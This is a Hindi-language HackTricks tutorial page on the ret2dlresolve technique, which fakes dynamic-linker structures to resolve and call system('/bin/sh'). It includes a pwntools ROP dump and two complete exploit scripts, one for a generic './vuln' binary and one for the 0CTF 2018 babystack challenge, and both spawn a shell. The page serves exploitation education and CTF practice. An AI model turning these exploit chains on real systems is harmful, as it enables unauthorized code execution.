# Ret2dlresolve

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

जैसा कि [**GOT/PLT**](../arbitrary-write-2-exec/aw2exec-got-plt.md) और [**Relro**](../common-binary-protections-and-bypasses/relro.md) के पृष्ठ में समझाया गया है, बिना Full Relro के बाइनरी पहली बार उपयोग किए जाने पर प्रतीकों (जैसे बाहरी पुस्तकालयों के लिए पते) को हल करेंगे। यह समाधान **`_dl_runtime_resolve`** फ़ंक्शन को कॉल करके होता है।

**`_dl_runtime_resolve`** फ़ंक्शन स्टैक से कुछ संरचनाओं के संदर्भ लेता है जिनकी उसे निर्दिष्ट प्रतीक को **हल** करने के लिए आवश्यकता होती है।

इसलिए, सभी इन संरचनाओं को **फेक करना संभव है** ताकि गतिशील रूप से लिंक किया गया प्रतीक (जैसे **`system`** फ़ंक्शन) को हल किया जा सके और इसे एक कॉन्फ़िगर किए गए पैरामीटर के साथ कॉल किया जा सके (जैसे **`system('/bin/sh')`**)।

आमतौर पर, इन सभी संरचनाओं को एक **प्रारंभिक ROP श्रृंखला बनाकर फेक किया जाता है जो `read`** को लिखने योग्य मेमोरी पर कॉल करता है, फिर **संरचनाएँ** और स्ट्रिंग **`'/bin/sh'`** को पास किया जाता है ताकि उन्हें एक ज्ञात स्थान पर पढ़ा जा सके, और फिर ROP श्रृंखला **`_dl_runtime_resolve`** को कॉल करके जारी रहती है, इसे **फेक संरचनाओं में `system` का पता हल करने** के लिए और **इस पते को** `$'/bin/sh'` के पते के साथ कॉल करने के लिए।

> [!TIP]
> यह तकनीक विशेष रूप से उपयोगी है यदि syscall गैजेट्स नहीं हैं (जैसे [**ret2syscall**](rop-syscall-execv/index.html) या [SROP](srop-sigreturn-oriented-programming/index.html) जैसी तकनीकों का उपयोग करने के लिए) और libc पते लीक करने के तरीके नहीं हैं।

इस तकनीक के बारे में वीडियो के दूसरे भाग में एक अच्छा स्पष्टीकरण देखने के लिए इस वीडियो को चेक करें:

{{#ref}}
https://youtu.be/ADULSwnQs-s?feature=shared
{{#endref}}

या चरण-दर-चरण स्पष्टीकरण के लिए इन पृष्ठों को देखें:

- [https://www.ctfrecipes.com/pwn/stack-exploitation/arbitrary-code-execution/code-reuse-attack/ret2dlresolve#how-it-works](https://www.ctfrecipes.com/pwn/stack-exploitation/arbitrary-code-execution/code-reuse-attack/ret2dlresolve#how-it-works)
- [https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve#structures](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve#structures)

## Attack Summary

1. कुछ स्थान पर फेक संरचनाएँ लिखें
2. सिस्टम के पहले तर्क को सेट करें (`$rdi = &'/bin/sh'`)
3. **`_dl_runtime_resolve`** को कॉल करने के लिए स्टैक पर संरचनाओं के पते सेट करें
4. **कॉल** `_dl_runtime_resolve`
5. **`system`** हल किया जाएगा और `'/bin/sh'` को तर्क के रूप में कॉल किया जाएगा

[**pwntools documentation**](https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html) से, यह एक **`ret2dlresolve`** हमले का रूप है:
```python
context.binary = elf = ELF(pwnlib.data.elf.ret2dlresolve.get('amd64'))
>>> rop = ROP(elf)
>>> dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["echo pwned"])
>>> rop.read(0, dlresolve.data_addr) # do not forget this step, but use whatever function you like
>>> rop.ret2dlresolve(dlresolve)
>>> raw_rop = rop.chain()
>>> print(rop.dump())
0x0000:         0x400593 pop rdi; ret
0x0008:              0x0 [arg0] rdi = 0
0x0010:         0x400591 pop rsi; pop r15; ret
0x0018:         0x601e00 [arg1] rsi = 6299136
0x0020:      b'iaaajaaa' <pad r15>
0x0028:         0x4003f0 read
0x0030:         0x400593 pop rdi; ret
0x0038:         0x601e48 [arg0] rdi = 6299208
0x0040:         0x4003e0 [plt_init] system
0x0048:          0x15670 [dlresolve index]
```
## उदाहरण

### शुद्ध Pwntools

आप इस तकनीक का [**उदाहरण यहाँ पा सकते हैं**](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve/exploitation) **जिसमें अंतिम ROP श्रृंखला का बहुत अच्छा विवरण है**, लेकिन यहाँ उपयोग किया गया अंतिम शोषण है:
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = elf.process()
rop = ROP(elf)

# create the dlresolve object
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

rop.raw('A' * 76)
rop.read(0, dlresolve.data_addr) # read to where we want to write the fake structures
rop.ret2dlresolve(dlresolve)     # call .plt and dl-resolve() with the correct, calculated reloc_offset

log.info(rop.dump())

p.sendline(rop.chain())
p.sendline(dlresolve.payload)    # now the read is called and we pass all the relevant structures in

p.interactive()
```
### कच्चा
```python
# Code from https://guyinatuxedo.github.io/18-ret2_csu_dl/0ctf18_babystack/index.html
# This exploit is based off of: https://github.com/sajjadium/ctf-writeups/tree/master/0CTFQuals/2018/babystack

from pwn import *

target = process('./babystack')
#gdb.attach(target)

elf = ELF('babystack')

# Establish starts of various sections
bss = 0x804a020

dynstr = 0x804822c

dynsym = 0x80481cc

relplt = 0x80482b0

# Establish two functions

scanInput = p32(0x804843b)
resolve = p32(0x80482f0) #dlresolve address

# Establish size of second payload

payload1_size = 43

# Our first scan
# This will call read to scan in our fake entries into the plt
# Then return back to scanInput to re-exploit the bug

payload0 = ""

payload0 += "0"*44                        # Filler from start of input to return address
payload0 += p32(elf.symbols['read'])    # Return read
payload0 += scanInput                    # After the read call, return to scan input
payload0 += p32(0)                        # Read via stdin
payload0 += p32(bss)                    # Scan into the start of the bss
payload0 += p32(payload1_size)            # How much data to scan in

target.send(payload0)

# Our second scan
# This will be scanned into the start of the bss
# It will contain the fake entries for our ret_2_dl_resolve attack

# Calculate the r_info value
# It will provide an index to our dynsym entry
dynsym_offset = ((bss + 0xc) - dynsym) / 0x10
r_info = (dynsym_offset << 8) | 0x7

# Calculate the offset from the start of dynstr section to our dynstr entry
dynstr_index = (bss + 28) - dynstr

paylaod1 = ""

# Our .rel.plt entry
paylaod1 += p32(elf.got['alarm'])
paylaod1 += p32(r_info)

# Empty
paylaod1 += p32(0x0)

# Our dynsm entry
paylaod1 += p32(dynstr_index)
paylaod1 += p32(0xde)*3

# Our dynstr entry
paylaod1 += "system\x00"

# Store "/bin/sh" here so we can have a pointer ot it
paylaod1 += "/bin/sh\x00"

target.send(paylaod1)

# Our third scan, which will execute the ret_2_dl_resolve
# This will just call 0x80482f0, which is responsible for calling the functions for resolving
# We will pass it the `.rel.plt` index for our fake entry
# As well as the arguments for system

# Calculate address of "/bin/sh"
binsh_bss_address = bss + 35

# Calculate the .rel.plt offset
ret_plt_offset = bss - relplt


paylaod2 = ""

paylaod2 += "0"*44
paylaod2 += resolve                 # 0x80482f0
paylaod2 += p32(ret_plt_offset)        # .rel.plt offset
paylaod2 += p32(0xdeadbeef)            # The next return address after 0x80482f0, really doesn't matter for us
paylaod2 += p32(binsh_bss_address)    # Our argument, address of "/bin/sh"

target.send(paylaod2)

# Enjoy the shell!
target.interactive()
```
## अन्य उदाहरण और संदर्भ

- [https://youtu.be/ADULSwnQs-s](https://youtu.be/ADULSwnQs-s?feature=shared)
- [https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve)
- [https://guyinatuxedo.github.io/18-ret2_csu_dl/0ctf18_babystack/index.html](https://guyinatuxedo.github.io/18-ret2_csu_dl/0ctf18_babystack/index.html)
- 32bit, कोई relro नहीं, कोई canary नहीं, nx, कोई pie नहीं, बुनियादी छोटे बफर ओवरफ्लो और रिटर्न। इसे शोषित करने के लिए bof का उपयोग `read` को फिर से कॉल करने के लिए किया जाता है एक `.bss` सेक्शन और एक बड़े आकार के साथ, वहां `dlresolve` नकली तालिकाओं को लोड करने के लिए `system`, मुख्य में लौटने और प्रारंभिक bof का फिर से दुरुपयोग करने के लिए dlresolve को कॉल करने और फिर `system('/bin/sh')` करने के लिए। 

{{#include ../../banners/hacktricks-training.md}}
